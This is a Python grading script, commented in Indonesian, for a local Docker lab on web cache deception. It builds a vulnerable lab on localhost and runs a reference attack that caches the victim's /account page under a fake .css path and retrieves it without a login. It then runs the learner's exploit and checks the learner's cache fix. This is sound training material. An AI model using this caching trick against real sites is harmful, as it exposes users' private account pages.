#!/usr/bin/env python3
"""
verify/verify.py — Verifier otomatis 2 fase untuk lab web-cache-deception.

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose` di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET /account (tanpa login) -> 401
      - GET /                              -> 200
      - serangan referensi (health)        -> halaman korban tersaji tanpa
        login (lab terbukti rentan; kalau ini gagal, yang rusak lab-nya,
        bukan learner)
      - exploit/exploit.py milik learner dijalankan -> mencetak STATUS: 200
  FASE 2 (dengan fix/): bangun ulang cache dari fix/cache, pastikan
      - serangan referensi GAGAL           -> tanpa login tidak lagi dapat
        halaman korban (401 dari origin)
      - baseline GET /account              -> 401
      - GET /                              -> 200
      - GET /static/app.css 2x             -> 200, fetch kedua X-Cache: HIT
        (fungsi caching normal tidak rusak)

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.parse

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080

LOGIN_BODY = urllib.parse.urlencode({"user": "victim", "pass": "victim-pass"})
VICTIM_MARKER = b"ACCOUNT-OWNER: rina"
REF_PATH = "/account/verify-ref.css"

PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " — " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def raw_request(method, path, headers=None, body=None):
    """Kirim raw HTTP agar request terkirim persis seperti ditulis.

    Membaca respons sampai EOF, jadi default-nya mengirim `Connection: close`
    (tanpa ini, server HTTP/1.1 keep-alive tidak menutup koneksi dan recv()
    nyangkut sampai socket timeout). Mengembalikan (status, headers, body).
    """
    lines = ["%s %s HTTP/1.1" % (method, path), "Host: %s:%d" % (HOST, PORT)]
    hdrs = dict(headers or {})
    hdrs.setdefault("Connection", "close")
    body_bytes = b""
    if body is not None:
        body_bytes = body.encode("latin-1") if isinstance(body, str) else body
        hdrs.setdefault("Content-Length", str(len(body_bytes)))
    for k, v in hdrs.items():
        lines.append("%s: %s" % (k, v))
    req = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + body_bytes
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        resp = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    head, _, resp_body = resp.partition(b"\r\n\r\n")
    head_lines = head.split(b"\r\n")
    status = int(head_lines[0].split()[1])
    hdict = {}
    for line in head_lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            hdict[k.decode("latin-1").strip().lower()] = v.decode("latin-1").strip()
    return status, hdict, resp_body


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    for _ in range(timeout):
        try:
            status, _, _ = raw_request("GET", "/")
            if status == 200:
                return True
        except Exception:
            pass
        time.sleep(1)
    return False


def login_cookie():
    """Login sebagai korban; kembalikan nilai cookie sesi (atau None)."""
    status, headers, _ = raw_request(
        "POST", "/login",
        {"Content-Type": "application/x-www-form-urlencoded"},
        LOGIN_BODY)
    if status != 200:
        return None
    m = re.search(r"session=([^;]+)", headers.get("set-cookie", ""))
    return m.group(1) if m else None


def reference_attack():
    """Serangan referensi: racuni cache sebagai korban, ambil tanpa login.

    Mengembalikan (status_tanpa_login, body_tanpa_login).
    Saat lab rentan: 200 + marker halaman korban.
    """
    token = login_cookie()
    if not token:
        return None, b""
    s1, _, _ = raw_request("GET", REF_PATH, {"Cookie": "session=" + token})
    if s1 != 200:
        return s1, b""
    s2, _, body2 = raw_request("GET", REF_PATH)
    return s2, body2


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    # ---- bersih-bersih dulu ----
    log("== bersih-bersih container lama ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])
    run_compose(["down", "--remove-orphans"])

    # ---- FASE 1: pristine harus rentan ----
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "--build", "-d"])
    if not wait_up():
        log("lab tidak merespons — cek `docker compose logs`.")
        sys.exit(1)

    log("-- cek fase 1 --")
    s_base, _, _ = raw_request("GET", "/account")
    check("baseline /account tanpa login ditolak (401)", s_base == 401,
          "dapat %d" % s_base)
    s_pub, _, _ = raw_request("GET", "/")
    check("halaman publik / hidup (200)", s_pub == 200, "dapat %d" % s_pub)

    # Health check: lab harus rentan terhadap serangan referensi.
    # Kalau ini gagal, yang rusak adalah lab/setup-nya — bukan learner.
    s_ref, body_ref = reference_attack()
    ref_ok = s_ref == 200 and VICTIM_MARKER in body_ref
    check("lab dalam kondisi rentan (halaman korban ter-cache publik)",
          ref_ok, "dapat %s + marker=%s" % (s_ref, VICTIM_MARKER in body_ref))
    if not ref_ok:
        log("\nFase 1 GAGAL: lab tidak dalam kondisi rentan. Periksa setup Docker.")
        sys.exit(1)

    # Artefak learner: exploit/exploit.py harus ada dan sudah diisi.
    exploit_py = os.path.join(LAB_DIR, "exploit", "exploit.py")
    if not os.path.exists(exploit_py):
        log("FASE 1: exploit/exploit.py belum ada — kerjakan fase 1 dulu "
            "(tulis exploit-mu di sana; lihat exploit/README.md).")
        sys.exit(3)
    with open(exploit_py, encoding="utf-8") as f:
        exploit_txt = f.read()
    if "TODO (fase 1)" in exploit_txt:
        log("FASE 1: exploit/exploit.py masih scaffold (belum diedit) — "
            "kerjakan fase 1 dulu.")
        sys.exit(3)

    # Jalankan exploit milik learner. Kontrak: skrip mencetak baris
    # "STATUS: <kode>" berisi status HTTP dari GET tanpa login ke URL
    # yang sudah diracuni skrip itu sendiri.
    log("menjalankan exploit/exploit.py milik learner ...")
    try:
        p = subprocess.run([sys.executable, exploit_py],
                           capture_output=True, text=True, timeout=60,
                           cwd=LAB_DIR)
    except subprocess.TimeoutExpired:
        log("FASE 1 GAGAL: exploit/exploit.py melebihi 60 detik (hang?).")
        sys.exit(1)
    out = (p.stdout or "") + "\n" + (p.stderr or "")
    m = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    got = m.group(1) if m else None
    ok1 = check("exploit learner menyajikan halaman korban publik (STATUS: 200)",
                got == "200",
                "dapat %s" % ("STATUS: " + got if got
                              else "tidak ada baris STATUS: <kode> di output"))
    if p.returncode != 0:
        log("  (catatan: script exit code %d)" % p.returncode)
    if not ok1:
        tail = out.strip().splitlines()[-8:]
        if tail:
            log("  output script (maks 8 baris terakhir):")
            for line in tail:
                log("    " + line)
        log("\nFase 1 GAGAL: exploit-mu belum mencapai 200 tanpa login. "
            "Lihat exploit/README.md.")
        sys.exit(1)
    log("FASE 1: LULUS — exploit learner reproducible dan berhasil.\n")

    # ---- FASE 2: fix harus ada dan benar ----
    fixed = os.path.join(LAB_DIR, "fix", "cache", "cache.py")
    if not os.path.exists(fixed):
        log("FASE 2: fix/cache/cache.py belum ada — kerjakan fase 2 dulu.")
        sys.exit(2)
    with open(fixed, encoding="utf-8") as f:
        fixed_txt = f.read()
    if "TODO (fase 2)" in fixed_txt:
        log("FASE 2: fix/cache/cache.py masih scaffold (belum diedit) — "
            "kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "--build", "-d"])
    if not wait_up():
        log("lab (fix) tidak merespons — cek `docker compose logs`.")
        sys.exit(1)

    log("-- cek fase 2 --")
    ok = True
    s_x, body_x = reference_attack()
    atk_gagal = not (s_x == 200 and VICTIM_MARKER in body_x)
    ok &= check("serangan web cache deception GAGAL (tanpa login tak dapat "
                "halaman korban)", atk_gagal,
                "dapat %s + marker=%s" % (s_x, VICTIM_MARKER in body_x))
    s_base, _, _ = raw_request("GET", "/account")
    ok &= check("baseline /account tanpa login tetap ditolak (401)",
                s_base == 401, "dapat %d" % s_base)
    s_pub, _, _ = raw_request("GET", "/")
    ok &= check("halaman publik / tetap hidup (200)", s_pub == 200,
                "dapat %d" % s_pub)

    s_c1, h_c1, _ = raw_request("GET", "/static/app.css")
    s_c2, h_c2, _ = raw_request("GET", "/static/app.css")
    cache_ok = (s_c1 == 200 and s_c2 == 200
                and h_c2.get("x-cache") == "HIT")
    ok &= check("file statis tetap ter-cache (fetch kedua X-Cache: HIT)",
                cache_ok,
                "dapat %d/%d, X-Cache=%s/%s"
                % (s_c1, s_c2, h_c1.get("x-cache"), h_c2.get("x-cache")))

    log("")
    if ok:
        log("FASE 2: LULUS — fix menutup serangan tanpa merusak fungsi normal.")
        log("\n=== LAB SELESAI: kedua fase LULUS ===")
        log("Stack (dengan fix) masih berjalan di http://localhost:8080.")
        log("./lab.sh stop  -> hentikan | ./lab.sh start -> kembali ke kondisi rentan")
        sys.exit(0)
    else:
        log("FASE 2: GAGAL — perbaiki fix-mu lalu jalankan verify lagi.")
        sys.exit(1)


if __name__ == "__main__":
    main()
